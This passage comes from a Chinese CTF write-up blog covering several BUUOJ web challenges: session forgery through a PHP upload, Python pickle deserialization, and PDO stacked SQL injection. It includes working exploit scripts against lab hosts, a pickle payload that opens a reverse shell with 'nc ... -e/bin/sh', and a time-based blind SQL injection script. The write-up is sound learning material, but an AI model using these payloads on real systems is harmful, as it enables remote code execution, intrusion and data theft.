class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha256&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid file path&#x27;</span>);<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir_path</span>, <span class="hljs-number">0700</span>, <span class="hljs-literal">TRUE</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-variable">$upload_result</span> = <span class="hljs-string">&quot;uploaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;error while saving&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">RuntimeException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$upload_result</span> = <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br> <span class="hljs-comment">//上面部分为上传功能，下面部分包括下载功能</span><br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$direction</span> === <span class="hljs-string">&quot;download&quot;</span>) &#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;filename&#x27;</span>));<br>        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid file path&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file_path</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;file not exist&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/force-download&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file_path</span>));<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">65</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-variable">$download_result</span> = <span class="hljs-string">&quot;downloaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;error while saving&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">RuntimeException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$download_result</span> = <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件上传+文件下载功能，通过<code>POST</code>传递三个参数：<code>direction</code>，<code>attr</code>，<code>filename</code>(第三个参数只有文件下载的时候才能用到)。<code>direction</code>这东西就是用来表示功能的：<code>upload</code>或者<code>download</code>功能。<code>attr</code>和文件路径有关系：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$attr</span>===<span class="hljs-string">&quot;private&quot;</span>)&#123;<br>    <span class="hljs-variable">$dir_path</span> .= <span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">#在dir_path后追加/会话用户名</span><br>&#125;<br></code></pre></td></tr></table></figure><p>目测可以用这个去看<code>username</code>字段是多少</p><p><code>filename</code>就是下载文件时的用户名。不过下载文件时ban了<code>../</code>和<code>..\</code>，感觉不能目录穿越下载任意文件了。。</p><p>看下如何获取<code>flag</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-title function_ invoke__">safe_delete</span>(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] =<span class="hljs-string">&#x27;guest&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>目测要通过<code>session</code>伪造<code>admin</code>用户然后上传<code>success.txt</code>到目标路径下。但这里有两个问题：</p><p>1.$_SESSION[‘username’] &#x3D;&#x3D;&#x3D;’admin’怎么满足</p><p>2.&#x2F;var&#x2F;babyctf&#x2F;success.txt这东西如何上传。</p><p>先尝试下载<code>session</code>文件：</p><blockquote><p>php的session默认存储文件名是sess_+PHPSESSID的值</p></blockquote><p>然后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;/var/babyctf/&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br></code></pre></td></tr></table></figure><p>我们把<code>attr</code>置空，然后直接<code>direction=download</code>转到文件下载，<code>filename=sess_7d764e03dc4cc7fff5efc9efb063f9b8</code>下载对应文件看看是否能成功：</p><p><img src="/img/1HFCTF2020BabyUpload.png" alt="1HFCTF2020BabyUpload"></p><p>然后是一些在<code>php</code>中<code>session</code>反序列化的一些知识：</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">参考资料</a></p><blockquote><p>session中的内容并不是放在内存中的，而是默认以文件的方式来存储的，可由配置项session.save_handler来进行确定。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。</p></blockquote><p>主要注意这个<code>php_binary</code>引擎：</p><blockquote><p>php_binary引擎:键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</p></blockquote><p>先生成目标<code>session</code>文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;D:\\phpstudy_pro\\WWW\\localhost&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/2HFCTF2020BabyUpload.png" alt="2HFCTF2020BabyUpload"></p><p>有了目标文件然后就要上传它，注意这段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$file_path</span> .= <span class="hljs-string">&quot;_&quot;</span>.<span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha256&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>会把文件名进行拼接处理：<code>名字_文件内容经过sha256加密的值</code>，这正好是<code>session</code>文件的格式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>,<span class="hljs-string">&#x27;./localhost/sess&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br></code></pre></td></tr></table></figure><p>第一个问题解决，第二个问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br></code></pre></td></tr></table></figure><p><code>file_exists</code>函数不关心目标是文件还是目录，只要有这么个路径就能返回<code>true</code>，所以我们直接创建一个目标路径就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;attr&#x27;</span>);<br><span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;/var/babyctf/&quot;</span>.<span class="hljs-variable">$attr</span>;<br><span class="hljs-comment">//attr=success.txt，后面再带啥我们根本不关心</span><br></code></pre></td></tr></table></figure><p>综上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://8af25a00-06de-4d4b-8452-fadcf1fb7598.node5.buuoj.cn:81/&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;direction&quot;</span>:<span class="hljs-string">&quot;upload&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>:<span class="hljs-string">&quot;success.txt&quot;</span><br>&#125;<br>file=&#123;<br>    <span class="hljs-string">&#x27;up_file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>      &#125;<br>r=requests.post(url=url,files=file,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>然后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://8af25a00-06de-4d4b-8452-fadcf1fb7598.node5.buuoj.cn:81/&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;direction&quot;</span>:<span class="hljs-string">&quot;upload&quot;</span><br>&#125;<br>file=&#123;<br>    <span class="hljs-string">&#x27;up_file&#x27;</span>:(<span class="hljs-string">&quot;sess&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sess&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read())<br>&#125;<br>r=requests.post(url=url,files=file,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>然后抓包把<code>session</code>字段直接改成之前hash的结果就行</p><h4 id="思路总结-1"><a href="#思路总结-1" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>post</code>文件上传。<code>session</code>有什么特性？<code>session</code>文件？和<code>PHPSESSID</code>有什么关系？<code>sess_xxxx</code>？<code>php</code>中<code>session</code>的反序列化机制？<code>python</code>写上传文件表单？<code>file</code>?</p><h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>商店类型题目</p><p><img src="/img/whatevrctfpicklestory1.png" alt="whatevrctfpicklestory1"></p><p>抓包看看：</p><p><img src="/img/whatevrctfpicklestory2.png" alt="whatevrctfpicklestory2"></p><p><code>base64</code>解码：</p><p><img src="/img/whatevrctfpicklestory3.png" alt="whatevrctfpicklestory3"></p><p>有乱码，不过大致能看出来存有<code>money</code>，购买的物品和用户身份码？</p><p>经过<code>pickle</code>序列化的数据通常是二进制格式，再普通文本编辑器中不可读：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>enc = <span class="hljs-string">&quot;gAN9cQAoWAUAAABtb25leXEBTXwBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBVgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQZlWBAAAABhbnRpX3RhbXBlcl9obWFjcQdYIAAAADgwNzUzODY5ZmEzODNlOGFjNWQ2YWJhM2FiYWU3ZGMzcQh1Lg==&quot;</span><br><br><span class="hljs-built_in">print</span>(pickle.loads(b64decode(enc)))<br><span class="hljs-comment">#运行后回显:&#123;&#x27;money&#x27;: 380, &#x27;history&#x27;: [&#x27;Yummy smörgåsgurka&#x27;, &#x27;Yummy standard pickle&#x27;, &#x27;Yummy standard pickle&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;80753869fa383e8ac5d6aba3abae7dc3&#x27;&#125;</span><br><br></code></pre></td></tr></table></figure><p>注意最后那个字段：<code>anti_tamper_hmac</code></p><p><img src="/img/picksroryyyyy1.png" alt="picksroryyyyy1"></p><p>所以这里直接修改<code>money</code>等字段是不现实的，不过既然已经知道<code>session</code>字段会被反序列化，那就直接让他执行命令就好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> commands<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">errorr0</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&quot;ls /&quot;</span>,))<br> <br>a = errorr0()<br>b = pickle.dumps(a)<br>c = base64.b64encode(b)<br><span class="hljs-built_in">print</span> c<br><span class="hljs-comment">#参考：https://blog.csdn.net/qq_51295677</span><br></code></pre></td></tr></table></figure><p>(注意这里不能利用<code>ls</code>等命令，会返回<code>500</code>。可能是解码后去找<code>moeny</code>等字段找不到所以报错了。可以通过反弹<code>shell</code>)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip address 9001  -e/bin/sh&#x27;)&quot;</span>,))<br>a = A()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><p><img src="/img/picklestoryyyyyyy2.png" alt="picklestoryyyyyyy2"></p><h4 id="思路总结-2"><a href="#思路总结-2" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>pickle</code>反序列化：序列化后的数据格式？<code>dumps</code>和<code>loads</code>？如果不能直接执行命令(500)，是否可以考虑反弹<code>shell</code>？</p><h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="/img/googlectf2019bnv1.png" alt="googlectf2019bnv1"></p><p>抓包：</p><p><img src="/img/googlectf2019bnv2.png" alt="googlectf2019bnv2"></p><p><code>&#123;&quot;message&quot;:&quot;120101345012450101230135012350150&quot;&#125;</code></p><p><code>&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;</code></p><p><code>&#123;&quot;message&quot;:&quot;1234010123502402340&quot;&#125;</code></p><p>感觉这个<code>JSON</code>就是利用点但不知道该怎么用。。</p><p><a href="https://blog.csdn.net/cjdgg/article/details/114420160">参考资料</a></p><h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>登录界面，<code>URL</code>值得注意：<code>/index.php?r=Login/Index</code>，注册功能没开放</p><p><img src="/img/spuctfweb4-1.png" alt="spuctfweb4-1"></p><p>利用伪协议读<code>index.php</code>没啥用。。抓包看下数据怎么传输的：</p><p><img src="/img/spuctfweb4-2.png" alt="spuctfweb4-2"></p><p>试试<code>SQL</code>注入吧，用户名改成<code>admin&#39;</code>：</p><p><img src="/img/spuctfweb4-3.png" alt="spuctfweb4-3"></p><p>拿字典<code>FUZZ</code>了一下发现没有啥过滤。。估计不是<code>SQL</code>注入？想办法看看这个<code>Lib/DBTool.php</code>也没法看。</p><p>后面去看了<code>wp</code>，说是<code>SQL</code>注入而且过滤了大多数关键字<code>select</code>啥的。。可是我很确定我在<code>FUZZ</code>的时候<code>select</code>和<code>123</code>的回显没任何区别。。后面尝试<code>admin&#39;</code>和<code>select&#39;</code>的时候发现第一个报错第二个不报错才知道是这么回事：只要回显<code>&#123;&quot;code&quot;:&quot;202&quot;,&quot;info&quot;:&quot;error username or password.&quot;&#125;</code>可以看成关键字被过滤了。。(唉感觉这个<code>waf</code>对我的理解能力来说不太友好)。后面在<code>FUZZ</code>的时候后面多加了个单引号(这样一来如果没被过滤直接回显语法错误，还是很好区分的)。</p><p>看了<code>wp</code>说是堆叠注入，一开始想用类似<code>x&#39;;show databases;--+</code>这种语句直接跑后面发现不行。。原因可能是这东西只能用在<code>mysqli</code>中？而这道题是<code>PDO</code>场景下的堆叠注入，只能考虑用预处理来处理。很好奇是怎么看出来是<code>PDO</code>注入的。。</p><p><a href="https://syunaht.com/p/2798247945.html">参考资料</a></p><p>先判断是否存在堆叠注入：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;   报错</span><br><span class="hljs-string">admin&#x27;</span><span class="hljs-comment">--+  报错</span><br><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;; 用户名或密码错误</span><br><span class="hljs-string">admin&#x27;</span>;<span class="hljs-comment">--+  用户名或密码错误</span><br><span class="hljs-keyword">admin</span>&quot;   登录成功<br>admin;&#x27;   报错<br></code></pre></td></tr></table></figure><p>看了下其它师傅关于堆叠注入的判断方法：</p><p><strong>加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。</strong></p><p>然后简单看下FUZZ的结果，过滤了大量东西，不过SQL这东西会自动把十六进制转换成字符串</p><p><img src="/img/spuctfweb4-4.png" alt="spuctfweb4-4"></p><p>网上偷的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author: c1e4r</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#题目地址</span><br>    url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#注入payload</span><br>    payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>        <span class="hljs-comment">#查询payload</span><br>        payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment">#将构造好的payload进行16进制转码和json转码</span><br>            datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;<br>            data = json.dumps(datas)<br>            times = time.time()<br>            res = requests.post(url = url, data = data)<br>            <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:<br>                flag = flag + <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_hex</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><code>glzjin_wants_a_girl_friend.zip</code></p><p>其中的<code>fun.php</code>存在文件包含(user_aotu_load方法)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;user_aotu_load&#x27;</span>))<br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_aotu_load</span>(<span class="hljs-params"><span class="hljs-variable">$className</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Lib&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$className</span>, <span class="hljs-string">&#x27;Controller&#x27;</span>) !== <span class="hljs-literal">FALSE</span> )<br>&#123;<br><span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Controller&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$className</span>, <span class="hljs-string">&#x27;Model&#x27;</span>) !== <span class="hljs-literal">FALSE</span> )<br>&#123;<br><span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Model&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$classPath</span> = BASE_PATH . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$classPath&#125;</span>/<span class="hljs-subst">&#123;$className&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$classPath</span>))<br>&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$classPath</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$classPath</span> = BASE_PATH . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$classPath&#125;</span>/<span class="hljs-subst">&#123;$className&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$classPath</span>;<br></code></pre></td></tr></table></figure><p>不知道这个方法在哪里被调用了，看看别的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 